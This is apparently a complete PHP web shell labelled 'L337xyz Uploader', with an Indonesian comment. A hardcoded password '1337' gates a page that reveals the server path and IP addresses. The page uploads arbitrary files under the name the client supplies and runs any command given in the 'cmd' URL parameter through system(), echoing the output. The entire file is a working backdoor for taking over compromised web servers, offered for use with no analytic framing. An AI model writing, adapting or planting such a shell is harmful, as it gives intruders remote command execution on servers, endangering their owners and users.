<?php

$password = "1337"; // Ganti password jika perlu

session_start();
if (!empty($_POST['pass'])) {
    if ($_POST['pass'] == $password) {
        $_SESSION['login'] = true;
    }
}

if (!isset($_SESSION['login'])) {
    echo '<form method="post">Password: <input type="password" name="pass"><input type="submit" value="Login"></form>';
    exit;
}

echo '<b>L337xyz Uploader</b><br><br>';
echo 'Current Path: ' . getcwd() . '<br>';
echo 'Server IP: ' . $_SERVER['SERVER_ADDR'] . '<br>';
echo 'Your IP: ' . $_SERVER['REMOTE_ADDR'] . '<br><br>';

if(isset($_FILES['file'])){
    $file = $_FILES['file'];
    $name = $file['name'];
    if(move_uploaded_file($file['tmp_name'], $name)){
        echo "<font color='green'>Success Upload: <a href='$name'>$name</a></font><br>";
    } else {
        echo "<font color='red'>Failed to Upload.</font><br>";
    }
}
?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<br>
<hr>
<form method="get">
    CMD: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
